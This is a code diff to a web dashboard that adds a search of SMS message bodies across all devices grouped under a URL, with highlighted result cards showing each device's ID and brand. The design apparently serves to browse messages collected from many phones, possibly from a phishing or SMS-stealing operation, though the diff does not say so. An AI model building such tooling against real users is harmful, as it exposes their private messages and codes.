@@ -104,6 +104,15 @@
   .enriched-info { font-size: 11px; color: var(--muted); }
   .enriched-info span { color: var(--text); }
 
+  /* ── SMS search results ── */
+  .sms-hit-card { background:var(--bg3); border:1px solid var(--border); border-radius:8px;
+                  padding:10px 14px; margin-bottom:8px; }
+  .sms-hit-meta { display:flex; gap:8px; align-items:center; margin-bottom:6px; flex-wrap:wrap; }
+  .sms-hit-device { font-size:11px; color:var(--accent); font-weight:600; }
+  .sms-hit-brand  { font-size:11px; color:var(--muted); }
+  .sms-hit-body   { font-size:12px; color:var(--text); line-height:1.5; word-break:break-word; }
+  .sms-hit-body mark { background:rgba(245,158,11,.3); color:var(--yellow); border-radius:2px; padding:0 2px; }
+
   /* ── Loading / empty ── */
   .loading { text-align: center; padding: 60px; color: var(--muted); }
   .spinner { display: inline-block; width: 28px; height: 28px; border: 3px solid var(--border);
@@ -163,7 +172,16 @@
       <button class="btn btn-ghost" onclick="openUrl(currentUrlId)" style="white-space:nowrap;flex-shrink:0">↻ Refresh</button>
     </div>
     <div class="device-filters" id="device-filters"></div>
-    <div class="device-table-wrap">
+    <!-- ── Per-URL SMS Search ── -->
+    <div id="sms-search-bar" style="display:flex;gap:8px;margin-bottom:12px;align-items:center">
+      <input type="text" id="sms-search-input" placeholder="🔍 Search SMS across all devices in this URL…"
+             style="flex:1;background:var(--bg3);border:1px solid var(--border);border-radius:6px;color:var(--text);padding:7px 12px;font-size:13px;outline:none"
+             onkeydown="if(event.key==='Enter')runSmsSearch()">
+      <button class="btn" onclick="runSmsSearch()" id="sms-search-btn">Search</button>
+      <button class="btn btn-ghost" onclick="clearSmsSearch()" id="sms-search-clear" style="display:none">✕ Clear</button>
+    </div>
+    <div id="sms-search-results" style="display:none"></div>
+    <div class="device-table-wrap" id="device-table-wrap">
       <table id="device-table">
         <thead>
           <tr>
@@ -413,6 +431,8 @@ document.getElementById('search-input').addEventListener('input', async () => {
 async function openUrl(id) {
   document.getElementById('view-urls').classList.remove('active');
   document.getElementById('view-devices').classList.add('active');
+  clearSmsSearch();
+  document.getElementById('device-table-wrap').style.display = '';
   document.getElementById('device-tbody').innerHTML = `<tr><td colspan="12"><div class="loading"><div class="spinner"></div><br>Loading devices…</div></td></tr>`;
   currentUrlId = id;
 
@@ -514,6 +534,7 @@ function renderDevices() {
 }
 
 function showUrls() {
+  clearSmsSearch();
   document.getElementById('view-devices').classList.remove('active');
   document.getElementById('view-urls').classList.add('active');
 }
@@ -696,6 +717,82 @@ async function searchDeviceGlobal(q) {
     info.textContent = `❌ Search error: ${e.message}`;
     grid.innerHTML = '';
   }
+}
+
+// ── Per-URL SMS Search ────────────────────────────────────────────────────────
+let _smsSearchActive = false;
+
+async function runSmsSearch() {
+  const q = document.getElementById('sms-search-input').value.trim();
+  if (!q) return;
+  const resultsDiv = document.getElementById('sms-search-results');
+  const tableWrap  = document.getElementById('device-table-wrap');
+  const clearBtn   = document.getElementById('sms-search-clear');
+  const searchBtn  = document.getElementById('sms-search-btn');
+
+  resultsDiv.style.display = 'block';
+  tableWrap.style.display  = 'none';
+  clearBtn.style.display   = '';
+  searchBtn.disabled = true;
+  searchBtn.textContent = '⏳';
+  _smsSearchActive = true;
+
+  resultsDiv.innerHTML = '<div class="loading"><div class="spinner"></div><br>Searching SMS across all devices… this may take a moment.</div>';
+
+  try {
+    const res  = await fetch(`/api/url/${currentUrlId}/sms-search?q=${encodeURIComponent(q)}`);
+    const data = await res.json();
+
+    if (data.error && !data.hits?.length) {
+      resultsDiv.innerHTML = `<p style="color:var(--red);padding:10px">${data.error}</p>`;
+      searchBtn.disabled = false; searchBtn.textContent = 'Search';
+      return;
+    }
+
+    const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    // Highlight matching term in escaped text
+    const escQ = q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&');
+    const highlight = raw => {
+      const escaped = esc(raw);
+      const re = new RegExp(`(${esc(escQ)})`, 'gi');
+      return escaped.replace(re, '<mark>$1</mark>');
+    };
+
+    if (!data.hits.length) {
+      resultsDiv.innerHTML = `<p style="color:var(--muted);padding:10px">📭 No SMS messages found containing "<b style="color:var(--text)">${esc(q)}</b>"</p>`;
+    } else {
+      resultsDiv.innerHTML = `
+        <div style="color:var(--muted);font-size:13px;margin-bottom:10px">
+          Found <b style="color:var(--text)">${data.hits.length}</b> message(s) matching
+          "<b style="color:var(--yellow)">${esc(q)}</b>"
+          ${data.hits.length >= 200 ? ' <span style="color:var(--yellow)">(capped at 200)</span>' : ''}
+        </div>
+        ${data.hits.map(h => `
+          <div class="sms-hit-card">
+            <div class="sms-hit-meta">
+              <span class="sms-hit-device">${esc(h.deviceId.slice(0,20))}</span>
+              <span class="sms-hit-brand">${esc(h.brand)}</span>
+            </div>
+            <div class="sms-hit-body">${highlight(h.body.slice(0, 400))}${h.body.length > 400 ? '…' : ''}</div>
+          </div>`).join('')}
+      `;
+    }
+  } catch (e) {
+    resultsDiv.innerHTML = `<p style="color:var(--red);padding:10px">❌ Error: ${e.message}</p>`;
+  }
+
+  searchBtn.disabled = false;
+  searchBtn.textContent = 'Search';
+}
+
+function clearSmsSearch() {
+  _smsSearchActive = false;
+  document.getElementById('sms-search-input').value = '';
+  document.getElementById('sms-search-results').style.display = 'none';
+  document.getElementById('sms-search-results').innerHTML = '';
+  document.getElementById('device-table-wrap').style.display = '';
+  document.getElementById('sms-search-clear').style.display = 'none';
+  document.getElementById('sms-search-btn').textContent = 'Search';
 }
 
 // ── Init ──────────────────────────────────────────────────────────────────────
